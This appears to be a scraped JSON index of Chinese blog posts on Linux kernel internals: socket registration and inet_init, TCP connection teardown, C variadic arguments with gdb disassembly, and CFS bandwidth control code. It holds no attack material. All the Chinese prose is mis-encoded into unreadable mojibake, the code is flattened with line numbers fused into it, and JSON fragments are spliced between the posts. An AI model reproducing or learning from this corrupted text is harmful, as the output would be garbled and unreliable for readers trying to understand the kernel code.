é€šè¿‡ä¸¤å¤©å‡½æ•°ï¼Œå¯¹åº”å†…æ ¸å‡½æ•° __sock_create 12345678910111213141516int __sock_create(struct net *net, int family, int type, int protocol, struct socket **res, int kern)&#123;\tint err;\tstruct socket *sock;\tconst struct net_proto_family *pf;...\tpf = rcu_dereference(net_families[family]);\terr = -EAFNOSUPPORT;\tif (!pf) goto out_release;...\terr = pf-&gt;create(net, sock, protocol, kern);\tif (err &lt; 0) goto out_module_put;... çœ‹ä¸Šé¢ä»£ç æ˜¯__sock_createè°ƒç”¨å·²ç»åœ¨ç³»ç»Ÿä¸­æ³¨å†Œçš„åè®®æä¾›çš„createæ–¹æ³•åˆ›å»ºsockå‡½æ•°ã€‚ 1234567891011121314151617181920212223242526272829303132/** *\tsock_register - add a socket protocol handler *\t@ops: description of protocol * *\tThis function is called by a protocol handler that wants to *\tadvertise its address family, and have it linked into the *\tsocket interface. The value ops-&gt;family corresponds to the *\tsocket system call protocol family. */int sock_register(const struct net_proto_family *ops)&#123;\tint err;\tif (ops-&gt;family &gt;= NPROTO) &#123; pr_crit(&quot;protocol %d &gt;= NPROTO(%d) &quot;, ops-&gt;family, NPROTO); return -ENOBUFS;\t&#125;\tspin_lock(&amp;net_family_lock);\tif (rcu_dereference_protected(net_families[ops-&gt;family], lockdep_is_held(&amp;net_family_lock))) err = -EEXIST;\telse &#123; rcu_assign_pointer(net_families[ops-&gt;family], ops); err = 0;\t&#125;\tspin_unlock(&amp;net_family_lock);\tpr_info(&quot;NET: Registered protocol family %d &quot;, ops-&gt;family);\treturn err;&#125;EXPORT_SYMBOL(sock_register); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127static int __init inet_init(void)&#123;\tstruct inet_protosw *q;\tstruct list_head *r;\tint rc = -EINVAL;\tsock_skb_cb_check_size(sizeof(struct inet_skb_parm));\trc = proto_register(&amp;tcp_prot, 1);\tif (rc) goto out;\trc = proto_register(&amp;udp_prot, 1);\tif (rc) goto out_unregister_tcp_proto;\trc = proto_register(&amp;raw_prot, 1);\tif (rc) goto out_unregister_udp_proto;\trc = proto_register(&amp;ping_prot, 1);\tif (rc) goto out_unregister_raw_proto;\t/* *\tTell SOCKET that we are alive... */\t(void)sock_register(&amp;inet_family_ops);#ifdef CONFIG_SYSCTL\tip_static_sysctl_init();#endif\t/* *\tAdd all the base protocols. */\tif (inet_add_protocol(&amp;icmp_protocol, IPPROTO_ICMP) &lt; 0) pr_crit(&quot;%s: Cannot add ICMP protocol &quot;, __func__);\tif (inet_add_protocol(&amp;udp_protocol, IPPROTO_UDP) &lt; 0) pr_crit(&quot;%s: Cannot add UDP protocol &quot;, __func__);\tif (inet_add_protocol(&amp;tcp_protocol, IPPROTO_TCP) &lt; 0) pr_crit(&quot;%s: Cannot add TCP protocol &quot;, __func__);#ifdef CONFIG_IP_MULTICAST\tif (inet_add_protocol(&amp;igmp_protocol, IPPROTO_IGMP) &lt; 0) pr_crit(&quot;%s: Cannot add IGMP protocol &quot;, __func__);#endif\t/* Register the socket-side information for inet_create. */\tfor (r = &amp;inetsw[0]; r &lt; &amp;inetsw[SOCK_MAX]; ++r) INIT_LIST_HEAD(r);\tfor (q = inetsw_array; q &lt; &amp;inetsw_array[INETSW_ARRAY_LEN]; ++q) inet_register_protosw(q);\t/* *\tSet the ARP module up */\tarp_init();\t/* *\tSet the IP module up */\tip_init();\t/* Setup TCP slab cache for open requests. */\ttcp_init();\t/* Setup UDP memory threshold */\tudp_init();\t/* Add UDP-Lite (RFC 3828) */\tudplite4_register();\traw_init();\tping_init();\t/* *\tSet the ICMP layer up */\tif (icmp_init() &lt; 0) panic(&quot;Failed to create the ICMP control socket. &quot;);\t/* *\tInitialise the multicast router */#if defined(CONFIG_IP_MROUTE)\tif (ip_mr_init()) pr_crit(&quot;%s: Cannot init ipv4 mroute &quot;, __func__);#endif\tif (init_inet_pernet_ops()) pr_crit(&quot;%s: Cannot init ipv4 inet pernet ops &quot;, __func__);\t/* *\tInitialise per-cpu ipv4 mibs */\tif (init_ipv4_mibs()) pr_crit(&quot;%s: Cannot init ipv4 mibs &quot;, __func__);\tipv4_proc_init();\tipfrag_init();\tdev_add_pack(&amp;ip_packet_type);\tip_tunnel_core_init();\trc = 0;out:\treturn rc;out_unregister_raw_proto:\tproto_unregister(&amp;raw_prot);out_unregister_udp_proto:\tproto_unregister(&amp;udp_prot);out_unregister_tcp_proto:\tproto_unregister(&amp;tcp_prot);\tgoto out;&#125;fs_initcall(inet_init); 1 tcp çš„ç»ˆæ­¢ä¼—æ‰€å‘¨çŸ¥çš„å››æ¬¡æŒ¥æ‰‹ï¼Œä¸ºä»€ä¹ˆæ˜¯å››æ¬¡æŒ¥æ‰‹å…³é—­å‘¢ï¼Ÿå…¶å®è¿™é‡Œçš„å››æ¬¡æŒ¥æ‰‹çš„å…³é—­æŒ‡çš„æ˜¯ä¸¤ä¸ªå¥—æ¥å­—ä¸¤ä¸ªæ–¹å‘çš„å…³é—­ï¼Œä¸¤ä¸ªå¥—æ¥å­—æŒ‡çš„æ˜¯å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ï¼Œä¸¤ä¸ªæ–¹å‘åˆ†åˆ«æ˜¯å‘é€æ–¹å’Œæ¥æ”¶æ–¹ã€‚ ç»å…¸æ­£ç¡®åœºæ™¯ï¼šå½“å®¢æˆ·ç«¯ c å‡†å¤‡ç»“æŸæ•°æ®å‘é€äº†ï¼Œé¦–å…ˆå‘èµ· FINï¼ŒæœåŠ¡ç«¯ s æ”¶åˆ°å®¢æˆ·ç«¯å‘æ¥ FIN ä¿¡æ¯å¹¶è¿”å› ACKï¼Œå½“å‰é˜¶æ®µ c å®¢æˆ·ç«¯ä¸å‘é€æ•°æ®ä½†æ˜¯è¿˜å¯ä»¥æ¥æ”¶æœåŠ¡ç«¯å‘æ¥çš„æ•°æ®ã€‚å½“ s æŠŠæ•°æ®å‘é€å®Œæˆè¿‡åå‡†å¤‡å…³é—­è¿™ä¸ªå®¢æˆ·çš„å¥—æ¥å­—ï¼Œå‘é€ FIN ç»™ cï¼Œè¿™æ—¶å€™æœåŠ¡ç«¯ä¸èƒ½å‘é€æ•°æ®ã€‚å½“ c æ¥å—æ¥æ”¶åˆ° s å‘æ¥çš„ FINï¼Œä¼šå›å¤ä¸€ä¸‹ ACKï¼Œå½“ s æ”¶åˆ°äº† ack å¥—æ¥å­—è¢«æ­£å¸¸å…³é—­ã€‚ 1 æ›´å¤šæè¿°å‚è€ƒ^wiki. [^TCP_Implementation]: TCP Implementation in Linux: A Brief Tutorial","tags":["tips"]},{"title":"to explore c va arg","path":"/2017/10/09/deep-explore-c-va-arg/","content":"ä¹‹å‰å†™ go è¯­è¨€æ—¶å€™å‘ç° go è¯­è¨€æ”¯æŒå¯å˜é•¿å‚æ•°ï¼Œä¸”å†™æ³•ä¸ c è¯­è¨€ç±»ä¼¼ï¼Œå°±å¥½å¥‡äº† c è¯­è¨€æ˜¯å¦‚ä½•å®ç°å¯å˜é•¿å‚æ•°çš„ã€‚è¿™é‡Œå‚è€ƒäº†[^this]ã€‚ C è¯­è¨€å¯å˜å‚æ•°é€šè¿‡ä¸‰ä¸ªå®ï¼ˆva_startã€va_endã€va_argï¼‰å’Œä¸€ä¸ªç±»å‹ï¼ˆva_listï¼‰å®ç°çš„ï¼Œ void va_start(va_list ap, paramN);å‚æ•°ï¼šap: å¯å˜å‚æ•°åˆ—è¡¨åœ°å€paramN: ç¡®å®šçš„å‚æ•°åŠŸèƒ½ï¼šåˆå§‹åŒ–å¯å˜å‚æ•°åˆ—è¡¨ (æŠŠå‡½æ•°åœ¨ paramN ä¹‹åçš„å‚æ•°åœ°å€æ”¾åˆ° ap ä¸­)ã€‚ void va_end(va_list ap);åŠŸèƒ½ï¼šå…³é—­åˆå§‹åŒ–åˆ—è¡¨ (å°† ap ç½®ç©º)ã€‚ type va_arg(va_list ap, type);åŠŸèƒ½ï¼šè¿”å›ä¸‹ä¸€ä¸ªå‚æ•°çš„å€¼ã€‚ va_listï¼šå­˜å‚¨å‚æ•°çš„ç±»å‹ä¿¡æ¯ã€‚ ç»¼åˆä¸Šé¢ 3 ä¸ªå®å’Œä¸€ä¸ªç±»å‹å¯ä»¥çŒœå‡ºå¦‚ä½•å®ç° C è¯­è¨€å¯å˜é•¿å‚æ•°å‡½æ•°ï¼šç”¨ va_start è·å–å‚æ•°åˆ—è¡¨ (çš„åœ°å€) å­˜å‚¨åˆ° ap ä¸­ï¼Œç”¨ va_arg é€ä¸ªè·å–å€¼ï¼Œæœ€åç”¨ va_arg å°† ap ç½®ç©ºã€‚ ä½¿ç”¨ä½¿ç”¨èŒƒä¾‹ï¼Œè®¡ç®—ä¸€ç»„ int æ•°çš„å’Œï¼š 123456789101112131415161718192021222324#include &lt;stdio.h&gt;#include &lt;stdarg.h&gt;#define END -1int va_sum(int first_num, ...)&#123; va_list ap; va_start(ap, first_num); int result = first_num; int temp = 0; while ((temp = va_arg(ap, int)) != END) result += temp; va_end(ap); return result;&#125;int main()&#123; int sum_val = va_sum(1, 2, 3, 4, 5, END); printf(&quot;%d&quot;, sum_val); return 0;&#125; åˆ†æå…¶å®å¯å˜é•¿å‚æ•°çš„å®ç°è¿˜æ˜¯æ¯”è¾ƒç®€å•ï¼šä¸æ–­ä»æ ˆä¸Šæ ¹æ®å‚æ•°å­—é•¿å–æ•°æ®ï¼Œå› æ­¤ä¸çŸ¥é“è¾¹ç•Œã€‚ è¿™ä¸€ç‚¹åœ¨åæ±‡ç¼–ä¹‹ä¸‹éå¸¸æ¸…æ¥šï¼æŒ‰ç…§ x64 çš„çº¦å®šä¼ å…¥å‚æ•° callerï¼š 12345678910111213(gdb) disassemble mainDump of assembler code for function main: 0x00000000004005f4 &lt;+0&gt;:\tpush %rbp 0x00000000004005f5 &lt;+1&gt;:\tmov %rsp,%rbp 0x00000000004005f8 &lt;+4&gt;:\tsub $0x10,%rsp 0x00000000004005fc &lt;+8&gt;:\tmov $0xffffffff,%r9d 0x0000000000400602 &lt;+14&gt;:\tmov $0x5,%r8d 0x0000000000400608 &lt;+20&gt;:\tmov $0x4,%ecx 0x000000000040060d &lt;+25&gt;:\tmov $0x3,%edx 0x0000000000400612 &lt;+30&gt;:\tmov $0x2,%esi 0x0000000000400617 &lt;+35&gt;:\tmov $0x1,%edi 0x000000000040061c &lt;+40&gt;:\tmov $0x0,%eax 0x0000000000400621 &lt;+45&gt;:\tcallq 0x4004d7 &lt;va_sum&gt; calleeï¼š 1234567891011(gdb) disassemble va_sumDump of assembler code for function va_sum: 0x00000000004004d7 &lt;+0&gt;:\tpush %rbp 0x00000000004004d8 &lt;+1&gt;:\tmov %rsp,%rbp=&gt; 0x00000000004004db &lt;+4&gt;:\tsub $0xf0,%rsp 0x00000000004004e2 &lt;+11&gt;:\tmov %edi,-0xe4(%rbp) // 1 0x00000000004004e8 &lt;+17&gt;:\tmov %rsi,-0xa8(%rbp) // 2 0x00000000004004ef &lt;+24&gt;:\tmov %rdx,-0xa0(%rbp) // 3 0x00000000004004f6 &lt;+31&gt;:\tmov %rcx,-0x98(%rbp) // 4 0x00000000004004fd &lt;+38&gt;:\tmov %r8,-0x90(%rbp) // 5 0x0000000000400504 &lt;+45&gt;:\tmov %r9,-0x88(%rbp) // ? æ ¹æ®å‚æ•°çš„ç±»å‹çš„å­—é•¿ä»æ ˆä¸Šå–å€¼ã€‚ [^this]: æ·±åº¦æ¢ç´¢ C è¯­è¨€å‡½æ•°å¯å˜é•¿å‚æ•°","tags":["tips"]},{"title":"cfs bandwidth control","path":"/2017/09/26/cfs-bandwidth-control/","content":"ä¹‹å‰çº¿ä¸Š 229 kernel åœ¨ä½¿ç”¨ cgroup cpu å­ç³»ç»Ÿå¯¼è‡´ crashï¼Œååˆæœ‰åœ¨ 3.10.0-514.26.2.el7 kernel åˆå‡ºç° crashï¼Œè®©æˆ‘å¯¹è¿™ä¸ªç‰¹æ€§é¢å¤–çš„å…³æ³¨äº†ä¸€ä¸‹ã€‚ åœ¨åˆ†æ cfs bandwidth control ç‰¹æ€§ä¹‹å‰éœ€è¦å…ˆçŸ¥é“ fair group scheduling æ˜¯ä»€ä¹ˆï¼Œå¼•ç”¨ zhihu[^zhihu]çš„ä¸€ä¸ªå›ç­”ã€‚ æ™®é€šè¿›ç¨‹çš„ç»„è°ƒåº¦æ”¯æŒ (Fair Group Scheduling), 2.6.24(2008 å¹´ 1 æœˆå‘å¸ƒ) 2.6.23 å¼•å…¥çš„ CFS è°ƒåº¦å™¨å¯¹æ‰€æœ‰è¿›ç¨‹å®Œå…¨å…¬å¹³å¯¹å¾…ã€‚ä½†è¿™æœ‰ä¸ªé—®é¢˜ï¼Œè®¾æƒ³å½“å‰æœºå™¨æœ‰ 2 ä¸ªç”¨æˆ·ï¼Œæœ‰ä¸€ä¸ªç”¨æˆ·è·‘ç€ 9 ä¸ªè¿›ç¨‹ï¼Œè¿˜éƒ½æ˜¯ CPU å¯†é›†å‹è¿›ç¨‹ï¼›å¦ä¸€ä¸ªç”¨æˆ·åªè·‘ç€ä¸€ä¸ª X è¿›ç¨‹ï¼Œè¿™æ˜¯äº¤äº’æ€§è¿›ç¨‹ã€‚ä» CFS çš„è§’åº¦çœ‹ï¼Œå®ƒå°†å¹³ç­‰å¯¹å¾…è¿™ 10 ä¸ªè¿›ç¨‹ï¼Œç»“æœå¯¼è‡´çš„æ˜¯è·‘ X è¿›ç¨‹çš„ç”¨æˆ·å—åˆ°ä¸å…¬å¹³å¯¹å¾…ï¼Œä»–åªèƒ½å¾—åˆ°çº¦ 10% çš„ CPU æ—¶é—´ï¼Œè®©ä»–çš„ä½“éªŒç›¸å½“å·®ã€‚åŸºäºæ­¤ï¼Œç»„è°ƒåº¦çš„æ¦‚å¿µè¢«å¼•å…¥[6]ã€‚CFS å¤„ç†çš„ä¸å†æ˜¯ä¸€ä¸ªè¿›ç¨‹çš„æ¦‚å¿µï¼Œè€Œæ˜¯è°ƒåº¦å®ä½“ (sched entity), ä¸€ä¸ªè°ƒåº¦å®ä½“å¯ä»¥åªåŒ…å«ä¸€ä¸ªè¿›ç¨‹ï¼Œä¹Ÿå¯ä»¥åŒ…å«å¤šä¸ªè¿›ç¨‹ã€‚å› æ­¤ï¼Œä¸Šè¿°ä¾‹å­çš„å›°å¢ƒå¯ä»¥è¿™ä¹ˆè§£å†³ï¼šåˆ†åˆ«ä¸ºæ¯ä¸ªç”¨æˆ·å»ºç«‹ä¸€ä¸ªç»„ï¼Œç»„é‡Œæ”¾è¯¥ç”¨æˆ·æ‰€æœ‰è¿›ç¨‹ï¼Œä»è€Œä¿è¯ç”¨æˆ·é—´çš„å…¬å¹³æ€§ã€‚è¯¥åŠŸèƒ½æ˜¯åŸºäºæ§åˆ¶ç»„ (control group, cgroup) çš„æ¦‚å¿µï¼Œéœ€è¦å†…æ ¸å¼€å¯ CGROUP çš„æ”¯æŒæ‰å¯ä½¿ç”¨ã€‚ å·§çš„æ˜¯çŸ¥ä¹çš„è¿™ä¸ªå›ç­”é‡Œé¢ä¹Ÿæåˆ°äº† cfs bandwidth control æ˜¯ä»€ä¹ˆ ç»„è°ƒåº¦å¸¦å®½æ§åˆ¶ (CFS bandwidth control) , 3.2(2012 å¹´ 1 æœˆå‘å¸ƒ) ç»„è°ƒåº¦çš„æ”¯æŒï¼Œå¯¹å®ç°å¤šç§Ÿæˆ·ç³»ç»Ÿçš„ç®¡ç†æ˜¯ååˆ†æ–¹ä¾¿çš„ï¼Œåœ¨ä¸€å°æœºå™¨ä¸Šï¼Œå¯ä»¥æ–¹ä¾¿å¯¹å¤šç”¨æˆ·è¿›è¡Œ CPU å‡åˆ†ï¼ç„¶åï¼Œè¿™è¿˜ä¸è¶³å¤Ÿï¼Œç»„è°ƒåº¦åªèƒ½ä¿è¯ç”¨æˆ·é—´çš„å…¬å¹³ï¼Œä½†è‹¥ç®¡ç†å‘˜æƒ³æ§åˆ¶ä¸€ä¸ªç”¨æˆ·ä½¿ç”¨çš„æœ€å¤§ CPU èµ„æºï¼Œåˆ™éœ€è¦å¸¦å®½æ§åˆ¶ï¼é’ˆå¯¹ CFS ç»„è°ƒåº¦ï¼Œå¼•å…¥äº†æ­¤åŠŸèƒ½ï¼Œè¯¥åŠŸèƒ½å¯ä»¥è®©ç®¡ç†å‘˜æ§åˆ¶åœ¨ä¸€æ®µæ—¶é—´å†…ä¸€ä¸ªç»„å¯ä»¥ä½¿ç”¨ CPU çš„æœ€é•¿æ—¶é—´ï¼ 0x00 CFS bandwidth control designå…ˆçœ‹çœ‹å¤§ä½¬æ˜¯å¦‚ä½•è®¾è®¡[^roadmap]è¿™ä¸ªç³»ç»Ÿçš„ (å…³æ³¨ä¼ä¸šåº”ç”¨)ï¼Œåˆ†ä¸º bandwidth control å’Œ CFS bandwidth control çœ‹è®¾è®¡ã€‚ é¦–å…ˆæ˜¯ bandwidth control è®¾è®¡è¦å…ˆè€ƒè™‘ä¸¤ä¸ªä¸»è¦é¢ï¼š The actual amount of CPU time available to a group is highly variable as it is dependent on the presence and execution patterns of other groups, a machine can the not be predictably partitioned without intimately understanding the behaviors of all co-scheduled applications. The maximum amount of CPU time available to a group is not predictable. While this is closely related to the first point, the distinction is worth noting as this directly affects capacity planning. å› ä¸º SCHED_RT ä¹Ÿå®ç°äº† bandwidth controlï¼Œè¿™é‡ŒåŒºåˆ†å‡ºæˆ‘å…³æ³¨çš„ CFS bandwidth controlã€‚ we have now opted for global specifcation of both enforcement interval (cpu.cfs_ period_us) and allowable bandwidth (cpu.cfs_ quota_us). By specifying this, the group as a whole will be limited to cpu.cfs_quota_us units of CPU time within the period of cpu.cfs_period_us. Of note is that these limits are hierarchical, unlike SCHED_RT we do not currently perform feasibility evaluaion regarding the defined limits. If a child has a more permissive bandwidth allowance than its parent, it will be indirectly throttled when the parentâ€™s quota is exhausted. Additionally, there is the global control: /proc/sys/ kernel/sched_cfs_bandwidth_slice_us å¤§ä½¬ä»¬åœ¨è®ºæ–‡é‡Œè®¨è®ºäº†ä¸¤ä¸ªæ–¹æ¡ˆï¼Œåœ¨ cfs bandwidth v4 ç‰ˆæœ¬åå¼•å…¥äº† Hybrid global pool å®ç°ã€‚ å¦‚æœä»…å®ç° local pool è®¾è®¡ä¸‹ï¼Œåœ¨å¤§å‹çš„ SMP ç³»ç»Ÿä¸­ï¼Œè®¡ç®—å‰©ä½™æ—¶é—´å’Œå­˜å‚¨å‰©ä½™æ—¶é—´æ˜¯ä¸€ä¸ªå¤šå¯¹å¤šçš„å…³ç³»ï¼Œè€Œé”çš„ç«äº‰å¯¼è‡´å¼€é”€å¤§ï¼Œè€Œå¦‚æœä»… tracking quota globally ä¾ç„¶æ˜¯ä¸èƒ½è§£å†³å‰é¢æ‰€è¿°çš„é—®é¢˜ï¼Œå”¯ä¸€çš„å¥½å¤„å°±æ˜¯å½“ quota æ²¡æœ‰ç”¨å®Œï¼Œæ¶ˆè€—çš„æ—¶é—´è®¡ç®—æ¯”è¾ƒæœ‰æ•ˆç‡ï¼Œæ˜¯å› ä¸ºæœ¬åœ° cpu å˜é‡ä¿®æ”¹çš„æ˜¯æ— é”ã€‚å› æ­¤å¤§ä½¬ä»¬é€‰æ‹©äº†ä¸€ä¸ªæ··åˆæ–¹æ¡ˆä»¥æ­¤æ¥æ”¹å–„æ€§èƒ½ã€‚ To each task_group a new cfs_bandwidth structure has been added. This tracks (globally) the allocated and consumed quota within a period. However, consumption does not occur against this pool directly; as in the local pool approach above there is a local, per cfs_rq, store of granted and consumed quota. This quota is acquired from the global pool in a (user configurable) batch size. When there is no quota available to re-provision a running cfs_rq, it is locally throttled until the next quota refresh. Bandwidth refresh is a periodic operation that occurs once per quota period within which all throttled run-queues are unthrottled and the global bandwidth pool is replenished. 0x01 å®ç°åˆ†æ1: æ ¸å¿ƒæ•°æ®ç»“æ„ï¼š æ ¹æ®å¤§ä½¬ä»¬è®ºæ–‡é‡Œé¢çš„è®¾è®¡è®¨è®ºï¼Œglobal cpu runtime pool çš„å®ç°å°±æ˜¯ cfs_bandwidth ç»“æ„ä½“ï¼Œå…¶ä½œä¸º task_group çš„æœ€åä¸€ä¸ªå­—æ®µã€‚quota æ˜¯é™äºçš„æ¯ period ä¸­çš„ï¼Œæ ¹æ®æˆ‘çš„ç†è§£ï¼Œæ­£å¸¸ task group è¢«è°ƒåº¦çš„æƒ…å†µä¸‹$$period &gt;&#x3D; quota &gt;&#x3D; runtime$$ï¼Œä½†æ˜¯æ—¶é—´çš„æ¶ˆè€—ä¸ä¸Šç«‹åˆ»ç›´æ¥ååº”åœ¨ global pool ä¸­ï¼Œè€Œæ˜¯åœ¨æ¯ cfs_rq ä¸­ local pool ä¸­è®°å½•å·²ç»è·å–å’Œæ¶ˆåŒ–çš„é…é¢ï¼Œè¿™ä¸ªé…é¢ä» global pool ä¸­ä»¥é¢„é…ç½®çš„å¤§å°è·å–ã€‚å½“æ²¡æœ‰é…é¢æ¥å¡«å…… cfs ä¸­çš„ local pool æ—¶å€™ï¼Œè¿™ä¸ª task_group ä¼šè¢«é™åˆ¶åˆ°ä¸‹ä¸€æ¬¡ quota çš„é‡æ–°åˆ†é…ã€‚ 1234567891011121314151617181920212223242526struct cfs_bandwidth &#123;#ifdef CONFIG_CFS_BANDWIDTH raw_spinlock_t lock; // /sys/fs/cgroup/cpu/cpu.cfs_period_us defulat: 100ms ktime_t period; // quota ä¸ºæ—¶é—´é…é¢ï¼Œruntime æ˜¯å®é™…æ¶ˆè€—çš„æ—¶é—´ u64 quota, runtime; // æ˜¯ tg ä¸­æ§åˆ¶é…é¢çš„å¸¸æ•°æ¯” s64 hierarchical_quota; // æ—¶é—´ç‰‡çš„åˆ°æœŸæ—¶é—´ u64 runtime_expires; int idle, period_active; // period_timer æ¯éš” cfs_period_us æ¥åˆ·æ–° quotaã€‚ // slack_timer åº”è¯¥æ˜¯è®ºæ–‡ 6.3 çš„ç¬¬ä¸€ä¸ªé—®é¢˜ã€‚ struct hrtimer period_timer, slack_timer; struct list_head throttled_cfs_rq; /* statistics æ³¨é‡Šè¯´æ˜æ˜¯ç»Ÿè®¡ç›¸å…³çš„ï¼Œä¸å…³æ³¨ */ int nr_periods, nr_throttled; u64 throttled_time;#endif&#125;; è€Œ local poolï¼Œå°±æ˜¯åµŒå…¥åœ¨ cfs_rq ä¸­çš„è¿™äº›å­—æ®µäº†ã€‚ 1234567891011121314151617struct cfs_rq &#123;...#ifdef CONFIG_SMP#ifdef CONFIG_FAIR_GROUP_SCHED...#ifdef CONFIG_CFS_BANDWIDTH int runtime_enabled; // è¿™ä¸ªå­—æ®µåœ¨ account_cfs_rq_runtime å…¥å£åšåˆ¤æ–­ä½¿ç”¨ u64 runtime_expires; // æ—¶é—´ç‰‡çš„åˆ°æœŸæ—¶é—´ s64 runtime_remaining; // è¿›ç¨‹ç»„çš„å‰©ä½™æ—¶é—´ç‰‡ u64 throttled_clock, throttled_clock_task; // tg è¢«èŠ‚æµè¿‡åçš„ä¿¡æ¯ u64 throttled_clock_task_time; // int throttled, throttle_count; // struct list_head throttled_list; // #endif /* CONFIG_CFS_BANDWIDTH */#endif /* CONFIG_FAIR_GROUP_SCHED */&#125;; 2: æ ¸å¿ƒå‡½æ•°ï¼š æ ¹æ®æˆ‘çš„ç†è§£è¿™å°±æ˜¯è®ºæ–‡[^roadmap]é‡Œé¢çš„ account_cfs_rq_quota() çš„å‡½æ•°å°±æ˜¯ account_cfs_rq_runtime() å‡½æ•°ï¼Œåœ¨ update_curr() ä¸­è¢«è°ƒï¼Œå‚æ•° delta_exec &#x3D; now - curr-&gt;exec_startã€‚account_cfs_rq_runtime() å‡½æ•°æœ¬èº«é€»è¾‘éå¸¸å°‘ï¼Œç›´æ¥ä»__account_cfs_rq_runtime() å…³æ³¨ã€‚ 123456789101112131415161718static void __account_cfs_rq_runtime(struct cfs_rq *cfs_rq, unsigned long delta_exec)&#123; /* dock delta_exec before expiring quota (as it could span periods) */ cfs_rq-&gt;runtime_remaining -= delta_exec; // å‰©ä½™æ—¶é—´å‡å»è¿›ç¨‹å·²ç»è¿è¡Œçš„æ—¶é—´ã€‚ expire_cfs_rq_runtime(cfs_rq); // æ£€æŸ¥ local pool çš„æ—¶é—´ç‰‡åˆ°æœŸæ—¶é—´ï¼Œå¦‚æœæ²¡æœ‰åˆ°æœŸå°±æŠŠåˆ°æœŸæ—¶é—´å†å¾€åç»­ä¸€å£ if (likely(cfs_rq-&gt;runtime_remaining &gt; 0)) // åˆ†æ”¯é¢„æµ‹ï¼Œä¹Ÿå°±æ˜¯è¯´ä»£ç æš—ç¤ºæˆ‘ä»¬ local pool å‰©ä½™æ—¶é—´è¿˜æœ‰ã€‚ return; /* * if we&#x27;re unable to extend our runtime we resched so that the active * hierarchy can be throttled */ // å¦‚æœ local pool æ²¡æœ‰å‰©ä½™æ—¶é—´ï¼Œå°±ä» global pool ä¸èƒ½å€Ÿæ—¶é—´ã€‚å€Ÿä¸åˆ°çš„è¯å°±è®¾ç½® curr é‡æ–°è°ƒåº¦ã€‚ if (!assign_cfs_rq_runtime(cfs_rq) &amp;&amp; likely(cfs_rq-&gt;curr)) resched_task(rq_of(cfs_rq)-&gt;curr);&#125; assign_cfs_rq_runtime() å¯ä»¥çœ‹åˆ°expires = cfs_b-&gt;runtime_expires;åcfs_rq-&gt;runtime_expires = expires; å’Œ cfs_rq-&gt;runtime_remaining += amount;è¿™ä¸¤æ³¢æ“ä½œå°±èƒ½ç†è§£ local pool é‡ global pool å€Ÿæ—¶é—´çš„ç»†èŠ‚äº†ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445/* returns 0 on failure to allocate runtime */static int assign_cfs_rq_runtime(struct cfs_rq *cfs_rq)&#123; struct task_group *tg = cfs_rq-&gt;tg; struct cfs_bandwidth *cfs_b = tg_cfs_bandwidth(tg); u64 amount = 0, min_amount, expires; /* note: this is a positive sum as runtime_remaining &lt;= 0 */ min_amount = sched_cfs_bandwidth_slice() - cfs_rq-&gt;runtime_remaining; raw_spin_lock(&amp;cfs_b-&gt;lock); if (cfs_b-&gt;quota == RUNTIME_INF) amount = min_amount; else &#123; /* * If the bandwidth pool has become inactive, then at least one * period must have elapsed since the last consumption. * Refresh the global state and ensure bandwidth timer becomes * active. */ if (!cfs_b-&gt;timer_active) &#123; __refill_cfs_bandwidth_runtime(cfs_b); // é‡æ–°å¡«æ»¡æ—¶é—´ __start_cfs_bandwidth(cfs_b); &#125; if (cfs_b-&gt;runtime &gt; 0) &#123; amount = min(cfs_b-&gt;runtime, min_amount); cfs_b-&gt;runtime -= amount; cfs_b-&gt;idle = 0; &#125; &#125; expires = cfs_b-&gt;runtime_expires; raw_spin_unlock(&amp;cfs_b-&gt;lock); cfs_rq-&gt;runtime_remaining += amount; /* * we may have advanced our local expiration to account for allowed * spread between our sched_clock and the one on which runtime was * issued. */ if ((s64)(expires - cfs_rq-&gt;runtime_expires) &gt; 0) cfs_rq-&gt;runtime_expires = expires; return cfs_rq-&gt;runtime_remaining &gt; 0;&#125; 3: enqueue è°ƒç”¨æµç¨‹ 1234const struct sched_class fair_sched_class = &#123; .next = &amp;idle_sched_class, // kernel é¢å‘å¯¹è±¡è®¾è®¡,åœ¨ core.c ä¸­è¢«è°ƒç”¨ã€‚ .enqueue_task = enqueue_task_fair, 123456789101112131415161718/* * The enqueue_task method is called before nr_running is * increased. Here we update the fair scheduling stats and * then put the task into the rbtree: */static voidenqueue_task_fair(struct rq *rq, struct task_struct *p, int flags)&#123; struct cfs_rq *cfs_rq; struct sched_entity *se = &amp;p-&gt;se; // å› ä¸ºéœ€è¦æ”¯æŒç»„è°ƒåº¦ï¼Œè€Œç»„è°ƒåº¦ä¸‹é¢ se æ˜¯æœ‰å±‚æ¬¡ç»“æ„çš„ï¼Œæ‰€ä»¥éå†æ‰€æœ‰è°ƒåº¦å®ä½“ã€‚ // å¦‚æœæ²¡æœ‰ç»„è°ƒåº¦æ˜¯æ²¡æœ‰å¿…è¦è·å–å±‚æ¬¡ä¿¡æ¯ã€‚ for_each_sched_entity(se) &#123; if (se-&gt;on_rq) // å¦‚æœ se å·²ç»åœ¨å°±ç»ªé˜Ÿåˆ—ä¸Š break; cfs_rq = cfs_rq_of(se); // è·å–å½“å‰ se æ‰€åœ¨çš„ cfs_rq enqueue_entity(cfs_rq, se, flags); // enqueue_entity å®Œæˆ se çš„çœŸæ­£æ’å…¥æ“ä½œ 123456789101112131415161718192021222324252627282930313233343536static voidenqueue_entity(struct cfs_rq *cfs_rq, struct sched_entity *se, int flags)&#123; /* * Update the normalized vruntime before updating min_vruntime * through callig update_curr(). */ // å¦‚æœå½“å‰ se ä¸æ˜¯è¢«å”¤é†’ï¼Œæˆ–è€… se å·²ç»æ˜¯åœ¨è¿è¡Œçš„äº†ï¼Œåˆ™æ›´æ–° se çš„ vruntimeã€‚ if (!(flags &amp; ENQUEUE_WAKEUP) || (flags &amp; ENQUEUE_WAKING)) se-&gt;vruntime += cfs_rq-&gt;min_vruntime; /* * Update run-time statistics of the &#x27;current&#x27;. */ update_curr(cfs_rq); // è¿™é‡Œé€šå‘ local pool çš„æ›´æ–°æµç¨‹, å‚è€ƒæ ¸å¿ƒå‡½æ•°åˆ†æéƒ¨åˆ†ã€‚ enqueue_entity_load_avg(cfs_rq, se, flags &amp; ENQUEUE_WAKEUP); account_entity_enqueue(cfs_rq, se); // è®°è´¦ï¼Œæ›´æ–° cfs-&gt;nr_running å’Œ load ç­‰ update_cfs_shares(cfs_rq); // æ›´æ–° se çš„æƒé‡ 